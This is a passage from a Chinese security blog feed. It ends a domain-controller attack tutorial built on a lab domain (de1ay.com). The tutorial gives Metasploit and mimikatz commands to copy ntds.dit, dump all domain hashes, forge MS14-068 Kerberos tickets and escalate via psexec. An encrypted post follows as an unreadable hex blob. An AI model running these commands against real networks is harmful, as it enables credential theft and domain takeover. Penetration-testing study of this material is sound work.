class="hljs bash">use auxiliary/admin/smb/psexec_ntdsgrad<br></code></pre></td></tr></table></figure><p>设置好参数后运行即可，会将ntds.dit和SYSTEM项复制并传送到&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;文件夹下<br>拿到两个文件后就可以用工具进行解密了</p></li><li><p><strong>基于msf会话获取域账号和散列值</strong><br>比如已经获取到一个会话了<br>然后使用</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/gather/credentials/domain_hashdump<br></code></pre></td></tr></table></figure><p>就会导出域中的全部hash值</p><ul><li><strong>ms14-068漏洞</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609222924824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来进行格式转换,msf不支持bin文件导出，所以要用mimikatz文件进行格式转换.在mimikatz输入命令,导出kirbi格式文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::clist <span class="hljs-string">&quot;20210609221820_default_192.168.43.16_windows.kerberos_125881.bin&quot;</span> /export<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609222904133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>比如现在有一个低权限shell<br><img src="https://img-blog.csdnimg.cn/20210609223517247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#48;&#45;&#48;&#x30;&#48;&#x30;&#x30;&#x30;&#48;&#48;&#45;&#100;&#101;&#49;&#x61;&#121;&#x40;&#107;&#x72;&#98;&#x74;&#x67;&#x74;&#x2d;&#68;&#69;&#49;&#x41;&#x59;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x6b;&#x69;&#114;&#x62;&#105;">&#48;&#45;&#48;&#x30;&#48;&#x30;&#x30;&#x30;&#48;&#48;&#45;&#100;&#101;&#49;&#x61;&#121;&#x40;&#107;&#x72;&#98;&#x74;&#x67;&#x74;&#x2d;&#68;&#69;&#49;&#x41;&#x59;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x6b;&#x69;&#114;&#x62;&#105;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/current_user_psexec<br><span class="hljs-built_in">set</span> technique psh<br><span class="hljs-built_in">set</span> rhosts DC.de1ay.com<br><span class="hljs-built_in">set</span> session 1<br></code></pre></td></tr></table></figure><p>就会得到高权限</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域控制器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl流量加密</title>
    <link href="/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
    <url>/2022/06/15/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/openssl%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="ece239375e8bf5f54079ed16021dc95b3a5f047b615852e6864c7201ecdff56e">2713301b30d54682598aa2e6ff3844e0606ed2b0202c15f993f77c2d635b2b9697e7c2bb79c1556a0e6650f7604f5b8694a58a1470d7c67c37ed0aa4baaa6bb894f40e6d05230426e05ca013d614f38bb45c8fa095b88ab9a71a82f444812adc851a6fcf8d08483f67ab6bd402a99d99fe5c6ae67ff4b294b81f7fdfd8e90b5b0d4bea9582bd66c22eb511925ce2c51ab4c4fbf3078ab2fee5d08f934941260437c12e4bcef4aedca0f77de98cd0f6565e6adfddaa4cfc1488972f158292cf1a5f98787fb67b7f5dca1f5d24b1b799b8e4ca308b4ba86ec9903f6d44c8c7ad5b19d490cd43d28b9d2ae68ce96c8d1b647c1c4bcbd479df631a1483e5e55420085563a262a35a51defa9a834b7d22b39c91d31e642fd8c73b29cf76253b4cacbcc799ab5e9bb6438a0309dd4e21c2eae4f80acff5b26e3e2e6f9e8ac5fb55b8315b226793630741fe2e1d4d64b52bc324b74cb4eca14a9b7847f1eb2f2ff38beff050a5bd6f7b6e2ac570ade2a72595cf99e3964be50164f0c38bc827924ec45da1c8b4f213d803999a09619ca8f91a056568202875d2ce3079a0ff89cf4d3b1177d498076556a80de1fb9256d8a0360c18207280190813bcdfafdf95819285bcfbc8d03d378a7fd310b48dfd56f408c2d2a83c3625fb3aa22f49f4b7b915937e2925d618e429c0772701e32db1cdf3b9040ac6d1d52c9e1145da736868e28e62a4991a2ffb925c3b73544438bd0282debc834d4c5ea005368443a5a80581ebda9a4e9b7c9f39b0d56c29be91423eb8762b749762c6e0707cb7ed29693fb6d24872b1ba243c232f154efc586fea38eb045dfbe2e2cecc69b12de5f1b8c7f95d5d5e2b6cfb832f4ae554d77da9f1230b86b9df388a039282b8e769c9f0b8a47e5b5105ebb4605aff4541ae701b17e7f874e0c34dfc66b267295bb3d9ea4b9d1fc5a83cecf8b8fda653f1163301a422d8e7368a864827b8b35595a01264d841d99d43333da8e514b61f5c3d5a2dbe324dd6c3a581b8b4fc46a5db810f2a866894ce746f7823b798b2de59591413d1012fc594d5da54dcb2ddfae0887be8f20e0a06239beeca328bd772af9caa6d2ef8e34c0a8124be361f69be814d64e23aee0f051b99d9f07ebbab928595c49d020b3e4238b83b7e2d4dc4f52b481961b4c106f5afcd6c2f75d93d8b202a297bf4d3727477c4da18d38b509d486491b2da9986c0df0d1028f47c154063e69c02bada9050a3e76cf3c59da9b374221430b32d3a05a215232f2b8290c1503f3b05c5b7fc632b9c4d39357203891f83420032502fd3dd3c2edad65a65597c0a724f73b92d496075ca7b671230d65c934bed2cb81859f5ee7f88b737d1a085c41affd5c5de0a2d7e9a3ee720e0d91fb1f2f98b6ce910913cd7bc054d27f64ce5a53e36bbe4f13ae89d3f19478152ee696dcbd0182526ce27cb69d8123d3152ecdd3a1c11a8ebc031b30b034b395c414c2147a431122ff9348bd8776ec4522749678038d1e60ef844774b5c48bae7912eb83013cb579c2f9828f34e8cea6a9e16d89c730d3a67a2258472b3fc498e0a409d82e2b4eda0b127ca50dc6b6bd65fbad5e0e6d6312a64939b75cafcba2bf599f014744213118e0cad62c319f2201c475da691b790a48bad20f9299f44497141e3412fc3b3c6e0d6f9791ce8d0aa3ffce4c8b477994ee2cf41dec532cfa91ed6ff9a3e15e5f57523ea4376a27e2fbce595ad0119d4df08d66e2cd5037fcc41d8a456b42d4481fb613c8b0fc1f28cc57798bb761ee76ed5e44561ae155c425eaec2b9425edaaa731534a0ded87f75daae6adb213a313e8d2fdb957f70e6e586f6dc636e651abf2023bb6e8fc6d508b5c62b53c0b4e492fb91f229188e33c502f45c5ce838dd3078e2169ccfdb85894de85f9cb6757b51594c38a5c61c59e9f5e982a8e17bf55864b2272c54a4f59fa4ee1535ec3f34226891a0090119ca57b80e8dd72afbec48e0564eec1bd546c986440e318ae8e321b000b10379a086719fb0ca9408add76d5b9b1ef4b2d7bb3db7033caf010eff3b4c977936d45a92c91c93ef23bcc7d028a0589713484ca191bf44ad951477ae9daba23167344d601fc8ac866f42af0b443bb8e2893dac96da4560092fab30c79c93dfa6e8520dd614939306658baef6b8ff116f945c35debbfb02b15af80112d7f264ad885e923473bcc8de2baf5925b3e11afc1033b2e38f31f6cf0b40ef464fefbe3037d179d66603d0195bb650217995c70614b88537dcda27e486c7e02777dc3f4b95e7c514794521b537a71258a1b32986c0cb88b80613dc04805da1addcabf6d2b0b6d399236d90ad444621531e529b79e89253479aede72f26f5f35161e2d4af7efbd4d021c3ac69fc3e7ea075b979fa6bd40a33c24bc7294a5435eddadceac8d6c69a0b3a2b131f2d1ca5388aa3f927061e7bf8b659053e8ee51eaa8ac87a9aadc8534e9664a9d878261abfe44864c6c005eaeecdd24ee81c8c366db26046d57282a9daffb7fb717950b5186b249d0256429d95c0e82ff952874b5984b5d858bf915100a484130fbec41c329bd614fbd73cf76f73772dedfe6e176d60638ec16761a7ba2336e9c4571fc886c79eece5b8371a25b5bde1dcdf4fdd9255eb8f76e4c31bb3e598f8c73cc70f8bfe6f20a583de63b454371c5b9fe5db904123ce247204c1e853f6175361972a815ff18737d3a6ba4486795ad9b5c0263a58df25f3581013eb13579744bfd558bc6730719796ee9d65dd1c98a55f1501a9c31ba41bce6019f3618a769fc345bc2be5773664b16e74005a7593e8354e2e7e9623a71bdc4c217173dd93f36d8dbcca551f576662ce3b0be70ce9baf7850759356d29cf8ee7e28bce7618cdbeb7c8987fb8d033fed2b98316252639119d2992dd7c5802daeae4ee0544a58f7a1095dc845b005ec3f179538483835db4d3b85944c04208277aadeea32711b395d7dcdcaaeaaf0d0a846b63558bb16487edcd859232b07ee68f9835edb2bb9ec1775e53b107b3b176e78f560ea0c169dbc71d2e3978c751dd6447406da301372679ed12328d348c9235014357a7a2999d551ab7a4bb4811f0dbac1d4bdb25508467be1c1f5a4e7f738eb928015794050185c034107c230a0c33c79ed342b2ecb71246ae2feedef194d366fbd47f6f7e09813492cd18988601e3158f8d928aab023cf90af44b84768e8b5b7fdd23ff8585cc1a2f71c308d25d8d05079a3d1ef398808321efcc1674c36983ffd39212a317f2ef222be87e10da2b952633611562af1823f9c8acc394dfe81d80c315595c285f8b194ea780074922e4280c967ec9564bcae3f323ebd840f05c01281d1f5a574c294b02887b73e61a4b67a5d4b32e3ebffc8ec6e4dd7a3d0cb6ea35955f981843d2e63b2c339504e23d368f228efef1b7f78f4f7a9f3e09a7ba1f080c2fbf4d9c17275e94e2994e684c4f2aa700388f3774c6f234cffae336041a2c8df597b2b1b31cf668185e1ecf11f9cd1fcf11593c005019ae58bad64f6ef8ae1bb838c2abfa5c56bbddc02e34c3426389d07f0c4bcc62932b2ade95116de3703d63c693404525f49c15f163d45b4d241784409f6e826f05bcb6134616309c30350be18ed43788f8b9098c1a5a8a5fc6063267bb924681b2a6b82935abc1361045543c8ae628f75a387d608aa3ddb5141f25502feee29e1bd7c46e4a6198c110c8aee3445262e5bba472b6f0a77c1235b8ee9dfa54dfa798b441c2a1c6e9fb68414dd26ee7cb03db70c7ac1158b6791bb22d71592544dbea67a4b955477b8cb5e7a0651efff0e3e4d073734016d6cdda518050088e15c38985823d64abf47202dbb451c27a2a7d2185eb15f960b0a4b559b774d16c285a6c764d65eafd34d264ac6fc2ff207762f20e9d7bc630f05851f8306b906a494f8a0e33ff2b6c31cd277161f48354fd5e8cf827972586b80ded41908d3f0c21de42822326a83a716461203a186f145e085738fc1ebd715d15a37e957213fa458c280d63a4dfa8fc86ed9d8b2806f6b86c97b744f7d8b8df5b665cc215fbb89391b2ffa74070a86b58017541d8d006f0dfb784b19adcd4c958334ac499db45f11815c77de712c00c9a113fc8b3cf9df0968714e4772a4212eb70f2cd377dc1b2277499ed0b16e63dccadb77ea5e545ac436792c0f68c686dbe30950c8bdfae9c7b051d8851f5f3b4f6e0c7564ac07edfc4fa64a4eeb68fa856ceefe027636166faf89f4e2d1e20e32edb85b0d505f7efe64623f6699aabb579084ba4a2dda7806c00457f23216cb1459416c7d1f6912fab027ff090e0ef96a1d7bd44206c6efba8ad0893feb3b433f0ec72cc5797dabd03e4fdb08c77722aa85dcc98d410850e1a7e6c1701673a450ba2848d449a7914dd6f6f99569b9ab0e2fae37d717c883f2948daa0da6300760f8180c460ff529f899337af1353885bb7a131dfd6a76f24cc09ac745dee2d9fcc422b382991dd6c1f25073d1c952a306d2731218b5fb4e940060bf99141a7e483c59aa55ea3149b134d17dd7f56ea999e712e122e6f9a4f5f09929596b1799d540ac73b67612fe126373b30d6cc478ba23f8342fc934f17e101690d5880222d2148be1790e8e360c4313343545be86fe6817aabd47af0c39542d7e55d68d799ddf63c2aea1dfa4d92fab09d7924360e34d7829b7e183c3fddac38d52842f63ef7a4bc16de4ef27be16809922e57fe2d0c4fb458a684ed843fce5493c7f3cb9e237b1f4bd5e9ab94ec7f7434d416bc86984ec7feffbdcce18c836146c0353f9193a118ee3d0b27199fc795ef7e8407608d11a47cf6536a9648d353452ec30a3abdbacd9046468e0878497e2d8b052ac62809cee3841900935320a8f6d1eb22d9704d980dbcd7ba0d3537939793fca4ff267c72c979e6a16a0ac4fdae0b4134647fa50dbe31df6fd707645e72ea75a564a4af22d5afc341093f0307e8fe158e22c151b67f6ac0d78f0eafdc5c707bf5e463ebb73d1c922067bfe3b1126abd633d06c277f43c75347701332ea94558836256e21a95ffc389f09414f9f20c3d0ba91357650df600bccc683d872be1aab15acaa56ba7815efe4f7298e4fdd3ea5776b4f6701841f1506b16096dd60da2a5e7bad6c6e6cb85a91f1653c29713306c670ed633b534a2af33fcd0f19ce0a6dd50bd66874fd8d40efae6f23097b49af4e59158479d587a9868245f0a5af537a8d42100bce4e14528d46e030e7b10829b81d1b5b6f9cb4d5d76514cff9b5bc2853457deec20b4ea29cd5d2135924db8b749291971153fc6fdcbbcb9e243ab834802ced77b3a868bbfc8a1c35d132238201717cbd6d8079f2fcf32cdf163d091b0722abe262d3650901f23296d40fcb074b0a7ab23214d09ebf013bdbc20e5e9262e9bf57dc325f90bbc3c1c7142cae7c560841aab3969876b0195a864f7def1c5eb23d0e932241dbd7ed7f5b7e25131e14f4a122f6faad01a03a40564aa453240869995303e6a1c36a8621912dd9a2aec52dcfbd8afe692ddfb3cd634d88379ae744772583bd7013004c59494cc6d3de4cde39c594f835341bd1010a81dbd897313771aaa7d537c91ede60e5d30d454c9bc46e0e310e8996374d7b294403fe30b75db0883df0399a7d0aa68f4ba4c94b26e9e0911c94ef5c6cd00354784dd6fff7c2357b11c5b0d86d0aa59924c955cafbb99afd6e8eb06ce0c57075a6d2253d81ac7d0a69b1693b7693a25823f4ab6d2a795e6f35bdb2533ebfe0144b744a3b62c6e9c8e35cd26d45f71135885a9fb4d231a471d5fedb78ba03bddb12295571b71b36ec610c99c4744f863fdffda792407bfca67ab71387c3f6e9c0eaf5a3cdb89001b85c2f23778391597be8258fb78844f1db9f517348a7d2983ba39b73cc6c72467f626b15fe09bb0f9ebbd55e73f371b321c98267b5613b082d8973a5496b6ecbeb0bc34b9d28733b7648564cc1373d53a9bf932a511d9dc03d5659fa1925babd1e7075ed24a6d2ee76b197d9432b7bf018210e301d497b708ff5fb4b354f0cdc9309cec3dad3905a68eca9978ef7feaaf29075731fc0fafe4ceaf1df55a300c6d4c0f0b66cb23056a421267744bfe878ad8e8516c439dce0d6af5961857dbf03a4ce88cff4eca05bf203bb229cea9b375d736b36b9cb8908c336535b70bb0658bbf56b166d0054126d59d385997dd8018053dfbf56f4318f2ec839c4ff4ab7224bf0d7e3ebe1ae8498750d1cd8ba35cc338aba076dc7475fd6b987ae46a324aed1d84b4ae17b0974f7f87f62e278e7906622f1fbfafcfa803e91d15621885d162b70d579507d311253222c06b29e08fe5893f7fe2b2136c8d6373afe5a643fd83078a3a1ea49c9fc744775ec450173feeb688e1732ac2ac65906a7a01fe0820c18c9ff974d377b66f319e0054c1250e879625a418ee9c4a92e2f652d25f9d5fc20237800c30e9f9e236a36ec879d3592c942e287998d1494e86634a58ddc5ff62e98f10a39f4f5f26a58f371148040e9705147beee11e522c5f662b521279ce8e2f93f322fbcadde25ed87362314d51b24192c17e0c4cb5ba2f051b78f72e2d670372e29de39239b6981c2cdd36a11edc53847c69d8a6452453ed1cf919a71b747e0b49a335b55ae8d7b689204bc5165c8a8759a5cdcc81c377118654a606b93eb643c99fd0681f17dbd5397a2423784b2fdf0e1c3439496fcff9e3b3c54d40cd1f579c2a342f406ec6bfe60a7c4d7138079c9f812d8b26415c9aedabde0d456389ac192b13ec58ecf4350dd077fd0c0eb0c90f8616030d60ec6f27d22c144b84d314bf98004f19e3d0d8e10e1d5ef7ccd7d7d28b3d0b63b57af5858b13134157f129d5276036123acb40481f93d44681d6a77057916c5fc6daee77d26209fd03b46cfd1e4a330a3a1947a4e59c02f92985f5b20c0e515401fdf2866a23f7f7996cf1fc44087056dc7bb40dc1c51a47215df756ac96205e51343fba19fd63b7fc3035b1fe6950e99852d824888312201519ad9f80a87bc9bc2b30b3c2c75121da77d755f54b2a60912932519e40444178a28abb8f46bba1bd03a304b61294e80e39f08770d87546f3b000111d6df833271bb71328d8c19379f511fe045473e5ea6f2be4aae96f2a653fce1f9aa54c988651dd5709346da508d141d454a9e3563e969444f146868e28d02a07510ecf761d78666fcb6501f0ad2ca1e787e39cd4347e252cc32b6b4970b890d94af19950ab5266f4bc102ee9b21fb537af430b69386047ec4a9f0ac053d49d028d9fdc1ade1de2104c8658c925cfa9eed43ded845673fc74fbf3d4029af3273756840a6b1a04cb993714c47107665f0f09b99ecf0a7b25d87bebfbd698afb62218700e2a3a78c9f1b5aba2755bffa596a99cf85d51c79b3adeab763d66ab31e2a1eca941952a0e119458672d763d246da48c9c2c350d07c2d570e426d259552b5ca351c311ad533aa09ace9bd99edf7082cb32c9aa86f7b7273ce4cd7222eebc0d7b74bb6d1d68714f5e6af128035bd6b5aaf532668e2a910236bf7fd298c97b70ead5959e52d380d43ebe9d6d875691efcc3baa80ef5ca39870c4a7e51105565e3ff0e24425dd66be0462c56a20767c91b3a232cd3f7c69e4b69eb03202ba30e7c18428c7eb98f5997f22e0dc74ab355fdedc591e04353e3e07a5658acdfe5e8e53415e9f65609a2751934e8e0106878159071d98d2c57323574ec3bc6e0bb84863be474f6f5d0f4ea3f8ed1fa4dc7ce3c1ba157adb6114489996b38de2370202428596d602ac3877a16376df6b480a12dc7595c13748178737cfd985939016eba5e1894bb75c6c0915687cf2fad9b92dc9ec714f0a8a27a2890d837eb805bd19950b30dd1b80b3bc35920d95f1e25383726401436579db0a93b47810592091a4f01cead1caa4e16d55d95ec297600516fa8abd21253182d892186ae6c9eefa5fb4cbda7b2e4539d26a301552ca698e7777864f0e970fd82094424156c2660f08fcce4c123cb25b2573cf7a9435b612425489cc1527bbcdb36b2ab08f65ddd619303f1c33b2806d052054d76552e228e403eea51e56fabc9b103ae9bc65cb0fd44bbb2abd410a37a2f15f002b0a8b302e537781825e4dc0dfeeb46cbd054379bf533a8feba2abf8f8de2242af4da499ef55b3ee2feb6c3e668859444929eb745458544ef9d70548c5ec53123bc68e54cbd885a85c5df31cf93c075a031422b5e80eefa2259fdc2f632fe1d428517254a4df2a23f7537dbffbb572f7dcc4cee2e98dcd12f1516d88768fcadd1fa6c87e2c6f7ed2ff657480140b553d4a04e4240dfaa46683306c8ef18a594f8d1e6c7678de007b5f0ae5d73b5effffd8639c4868c6f5d485977ba7469ddc5c7800f66f6a1690c97cad198f36b18845dc9751e37d8715868182390714c392e6fe7dc4a0cf83e5ae4cca84745c023c0668389c03b1d0ac0401cd97698a81d6cf7bd0f43882ffd11e4d4853c6a316b0444671ef4d82342da610f71a012da595de5a1f0922454471466821bd1f595296528cff927438ec7a8a6234f7834006f667e4522f9604304341d5f93765095989d6561a293fb2c27ff11fafa650ddeac0555b8fabce490535771aa440001ae32195db5880a147fa32fdcda0dfe249c872999ef1aedf8bb2187c5a5d37f18f0e5fb5a3f2fec2dfe02502bad1b5babe314974b1af5e8f867a30f2ee8c11168504bdca6168ffeb8b02c2bc88d9978fa62aff5ebcd07da4e4ce655acdb12f62c93b64a1153f5f6fdecea55228e0b6784eb498cb1f18ac5495ff95bb73ce928ac6df8fb4756d7e8e563ecf70570d320086641a71cd5db107695e0a6610470148fd7358f09017e26438ae2640393c65abed32f0cb5f14ac0d8fdc4072622997d2edb5b6042d6d0bfc3bb78dff00d735b17c92ccf7b7459c4bb22edb0453d7e74cf5eb69b17ef7cca909a146f86ca06ce3d1959d9b8a158f2b0c5cf9362e70efd665afec3d88168d8e1465cedd2b760ef09a1a9b2209cc013d29c6343507bd04c8bd36bcaae3931b177b4ac657503758d071cea718f28e26e7ebe3ae202d81738706cbf5c5266720b076e9f8714570ff98ac9ad9ee25a812dce970ba0ae06eaf1fb3aceeeae7a7d7c0825f1b140740aaa29b1392007c6603386bbf231c8218140a542f2953a411274f79f154aad48318595b02793c16fe022dc57dac6258347f51f7fa754414ae31d944770e6e160a95610aa1d5e369b9f194a365fd7b8ff449e208abd2c7ce1cc89adb392744a4fc57c562687f48607bfade3bf0cafbd8451a5cecc7f0d2cd77f95b18f9a1603a3b9bd81d69306e84de7a8cff8641541a2f0672c815770fd3a41e2d09f1055af43c17dc35d1501dcb943b3baa2c47f29f15c2dad7db83c36c7319e81fd2f99d02f961e0d875c4b5277cb12621b3d133356c2b552346f2a1688bdf99770ceecb9819b5bf37c0ac2a5e58171e9e4185616de11c9fddd6e64f2b23668082cbce30e906352f50fc2d06bd53dde4503b337eb18cb5b5ce73b70f15be2992dd3c39d2dd275d72fed68fcbe4994a6970dc189857bb96483c3e39747314f0b2ccde9191c5adc47badc3cce4c751af542cbeb2e63fbd8e0c85613b20f5d254d64cacad5355626aca070d11633345472f1f21e75e8e092d7599e7fbcaebdfa5ae514cd4a55891c7f51a1dda1bd286b2f8f9bd4ace869d71be466532b450c938554e685fb272b4def9139269a5cd825f1ad697b8b2b9a130cda84ea26bf91f00b662e76e722b5b43abe6be9f8deccff9ebd6da91cc48ae21e081f347139aecf67ec1d6ef56850c5d88a1114d395aa4737c03bb4c2ad695ddca029aa4162f8d0835099c3a03631a8d6970bf47283ba14ef5d9b056003f4c5ae0fb2fb0427afed7a7cf2f3ab1f4772b8729c12bbcb51a192bc81cf6ee6f19b6eb6b35a54fc0ddc1873c3d5434584ba28a6d5cf8e3095e362fd15f551dee65b9d0810a11342cf3829903fd2a6feae232babb9f1067919ba88b01ecfb83fcf627b6bb038860da3feb2a49eb11112ef6e8d5d13ee24b1373b6af06fb64954bf9dddcf1273f87d0483e2983d0d3562ccad69e3239cb90dd8165cb69925a427e5cfb86cb331db08c59e98753183ef78f070d423d1704b83d05090220658f4e9d187e99689c999d03ac754cd104d9955354ddfe0a608cc4ad81be099c9e02c8e2a33fd17d56cb3612657cbab9b5da49442fbc7dece85f4c328a9acc9188072dd638db1dbe29535bbc820f22859b02836273e6772b41f36b8579efe2ed4a06921591a5a4d2d29c5f5ba072f8e749c174be0c39e5b6a75655bc9209cf8a1145de7dee49a3c0891701a66212df16e4e56f1d90744dc54baa51cec310c5086a2c6b7397481601f882315b42bbea9b745a4d302393fad128fd5ea7ec69605693d2750e372876d1df82c8300da5f2ee50a78333805cb3815d9d31fa28ed0523355662fab8b64a28681c1aa49a8373c03d42d0b8eeb3e631916f649a7e41cfe577fc8ae8bb095cc032e1a1166c684be159943046731e1b0ac18d00162c9941374e299be23a6201baca25501655d04d21afc94f730801603db13e3c863cd36e0e72da647baba9945485f1a73d0af9402d310a4efd3fce3ea44375887558851371219620e0144ad842389315de38bc0c7d72401b3aecd024d06ddf04d933462daecc20c8107cf566099cb987a37b53eca7db9e0a7d1b6fa5d5f6937f52212f599255139a40dcd021a55e4998909fa40322ee7679b55a45de1ccf67a5727377af703d1b37c6699c4cbdccb3753428c1da1cfbfcd343aca623b0956197e4611902d073ef308360cf3c73b923330f7dec8aa5d0dd10ef52e61f9ab93c8dfd81147e60763515c5ad7c0464eb33fe2c57882eb84c23f281b78eb9eb200a4a1c185539cbc32678c5f756b19a5d462b26753e0ce4f5704117cba96b5328f82a957a9b6d7a7385f8b8d1cebb57e791c9379ad22263ff67bd4bebac9f7356d8f99f1a968e252b7e3b3bcdfb26f39e912b4d04786b0bfbaebb3d9ad567f7960cbddd951bc0ff2ce9dddd309a0ec13a417ac7ac34c2f4fef6608fe24c9c21c851ae6e141e3555b922210bb99f51c796c7ed5a672d74b58d2e4c03831aa3fe8d89f880c6f4d303f788a6fa1a153eb0b9a768c7463ef13276b5c6c9478cafdf42543e1d8b79c500845b760392d12671f9a063f640abc7282a0d6d9482746d1d78918be57ccc214c17fdf3f930f362d3d9b49e2f7461cfd4a762405d37eb502320e744d32a7ef9c70590b48419ba618324e8b3cd43498a1098d5a4c18c5f05d681daef046a50f5dddf45caaa9789c761a88f25971f7ae501db277d29b9212ba48692207d736c193e634828fbcf931d31f76d7f8a3c682506dc5511e341d321477c2a9064a2799a3a731899dbbdc6f42b2efa36f78de194ac836decbc6a509e30f3bd918a8e3e52e02c8ebaff3d297c708170c4566a551bb5a215cdb38105b7dff49af51698622bc8c71508b08e9d3266f04918d7e07c97b1635f047432fa5794b6eea4b06c6557ea189d530a968f8d8f38eccbeb8ffd32eb232c0541e8ead0dc080053d0174ae588366780f619b0cb5856ce3bd69c59f25603c26523e82a93059e3e96cfc4d5256a98e7e8337b35b9cda8599c4d542fbc49145266e8e26d4b1a4492c54d440a9ff19372aa2ed81f0ac6a889c6868c7ddf4e31300ca371b8d5853a09ec4b881c9835509128cf030b79ffce9011c288b8fd02c96ff84e3321be6871b8d76d2a64b937f6ae5c0f2c0201c95eff4e387296956163d0970e41f3d38c43c3abd626182556b202d54e41d696d4cc11cee9f454e4613e3a14cac5f2ba4c05c905fb70cf0e598fd070b02f9ba243f74cc2c16704eae4564c096b7afbc171ea4648443264b58ada5e634e7b0089a9d928976f195372fbf08647e0640bc0b3339798a86228142402cd5f45da0132c7603d24a2f1bfbb6ba44bc20ca6fbcafcd36f3bd4b6f09fb467e094457be74e6c4a4627699e1076d77b66da11e934c0d580b9b55eb0940213098376d9ac6769251edb969618c40bbaa7d4790095a7e8459b4646e1337a3b05e09b51416a83fd601c005f8c9c37fd855043adba533bc63db4651da23ba1756f49b36f6ca2290631d8ab11b40e62d29539cda675308e57b7f5dcb103716e962e66776d6bde42e5487d65bbdf5f5939cc8345040dfc640b8d206046124fdf05c10b12f904582225e7f31eb955212dcb195ae6834d76c5cd582f6b5f362c976c9945955b8c7ce1f0e72fba2f85d9db61f884f1c4b96635490f5dc2bd23b81544201f3cf0a4f1ee009c8dd8453880a97cfd43b580a211e343cc12c04aa8b478d45ce71102268490dd83cb9f703ddd696d4fd8b67177c3542ed2c5879aa26072032b96e1a1773561cb073f93ea5448aa4d311070e87f8da819ecf0a66d0d27a5d0eb2b3b5bba7161cb8736f46eaf35fe1e7416ef4b2948e13fd406cd2078077f6bc03c76dd7403825cfe9eedfcbac8851bfce5e675909c82e4ff28ffe305d83fe595b76f1347c4adb4dfaf8e30d9e16a6e4c24bee5cf6c1316b8ccf5345ca13046d77a6db8affaf125af86511dad64743d20b6db245253f02a169eda7583bd81a65586162bad9c0f8f8f929804d3c8e26b6799db6602972884a3353cfbd11c6750cc5d90a041d6d59fc0cdeb933ba78d9a0776d4b522fd023e310ff6ffeab8070f4338333b5795de446129a48b72e90037cd9348f3babaf190ce849c533de90c3110aa5c8bc3cee8b130cfe1b52dad776fd917a37adf4335e4b978a639312de78265dda585902fd4bb88893fdaee8d3b4739a997de77311504ef54177284a561a992b350c1acd8e87835dbd9ae57ca1a387927807739200c36053da0bc15c4bd34f5bbb0e2c7280d5024697f476644fb2a16c36df78dc59fc2a1c42ae06c59f2285c363ba40ab7e8b530344995ea6b92008d4e7b0bf445d4fc3bbcbe1fc1eb6b88b3ef8421a88e3ba87f17eb79a4a723613881172d8649d54699bcd69357bed1018d5775cceee36944039c873e9adc7e7a7a0e250d646f94385001c98994a48028bfcbdfd771ab21d11c92d47744a3de764ddbd6d3617a4d95ee11998b29ab175b072ff0a850f9677103d9b38004383e15d2795a01624b5c57d3bee0f03f1ee863d4bf58c282d9f38d26be06e0522de87724574eded3737fd6af072ece61431f969f9812228646c1490013fd6f3d98e61e719854bd8ae1f0d487d3c083cf5dbdaa2ea0153c501e2aa2c77cb9bc1a0951716c03954282bfd777d15a7951f0aab3f75d5d9fff6511c8f5e7231530de39580d59a5d371aacb3eba050d7b5c8b637d7fe8f311670a3e3a5b8561ea37ed13ef76200b356529002f77192bbbc322b02ca1997b85825c02ca1f3dfafbc81219c3d8fcee7cb6b1dba8f90b09698e71927be618edb3b2e9933712fb379a1c0b00871923d47c762d1dbd65d6c2fbfcf047ed281dfe80b81760ac086ea1cc4c6cb526d12f469e6d589f51371570b393d8ecdb25d07627ab519ebd510ba933560ba490ae32fa1ff138975360c14e53451587f7115999903e27f23f45cb3d2a04993f496855c7b3de500e8c24851daa454ea2c368e739027c6981f75c8d2dfeab38fbe5f1597233943b73d3aac19874e0c28c86e4a25ff3af7caf48c19c9e1b66e872109f767d01280ceccf050feb73f803e79a7267b4b4527d62378ec39efb3eddbf22b73d2dff38ce2236c381eb157f36963b441e2a5144c8253113a877124e6152369a3f509814b22204a5cd926d7ec80ea46db21b02e31de19267336eef2425c1c205b46011245cd2bd491ca2d